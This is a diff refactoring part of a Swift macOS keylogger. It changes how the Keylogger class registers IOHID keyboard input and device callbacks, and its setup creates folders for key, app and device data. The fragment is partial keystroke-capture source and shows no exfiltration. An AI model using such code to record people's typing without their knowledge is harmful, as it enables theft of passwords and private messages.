@@ -10,7 +10,7 @@ import Foundation
 import IOKit.hid
 import Cocoa
 
-class Keylogger: CallBackFunctions
+class Keylogger
 {
     var manager: IOHIDManager
     var deviceList = NSArray()                  // Used in multiple matching dictionary
@@ -20,13 +20,13 @@ class Keylogger: CallBackFunctions
     var keyData:URL                             // Folder
     var devicesData:URL                         // Folder
     
-    override init()
+    init()
     { 
         appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
         keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
         devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
-        super.init()
+
         if !(FileManager.default.fileExists(atPath: appData.path) && FileManager.default.fileExists(atPath: keyData.path))
         {
             do
@@ -61,12 +61,12 @@ class Keylogger: CallBackFunctions
                                                             name: NSNotification.Name.NSWorkspaceDidActivateApplication,
                                                             object: nil)
          /* Connected and Disconnected Call Backs */
-        IOHIDManagerRegisterDeviceMatchingCallback(manager, Handle_DeviceMatchingCallback, observer)
+        IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
         
-        IOHIDManagerRegisterDeviceRemovalCallback(manager, Handle_DeviceRemovalCallback, observer)
+        IOHIDManagerRegisterDeviceRemovalCallback(manager, CallBackFunctions.Handle_DeviceRemovalCallback, observer)
         
         /* Input value Call Backs */
-        IOHIDManagerRegisterInputValueCallback(manager, Handle_IOHIDInputValueCallback, observer);
+        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
         
         /* Open HID Manager */
         let ioreturn: IOReturn = openHIDManager()
